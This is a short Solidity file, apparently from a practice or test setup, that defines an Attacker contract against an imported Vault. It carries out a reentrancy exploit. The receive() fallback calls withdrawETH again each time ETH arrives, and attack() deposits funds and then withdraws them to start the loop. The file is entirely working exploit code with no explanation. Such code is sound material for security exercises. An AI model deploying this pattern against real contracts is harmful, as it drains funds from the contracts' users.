//SPDX-License-Identifier: Unlicense
pragma solidity 0.8.9;

import "./Vault.sol";
import "hardhat/console.sol";

// TODO attack vault
contract Attacker {
    Vault public vault;

    constructor (address _vault) {
        vault = Vault(payable(_vault));
    }

    receive () payable external {
        console.log("RECEIVE()!!!!!!");
        vault.withdrawETH(msg.value);
    }

    function attack() payable external {
        uint amount = msg.value;
        vault.depositETH{value: amount}();
        vault.withdrawETH(amount);
    }
}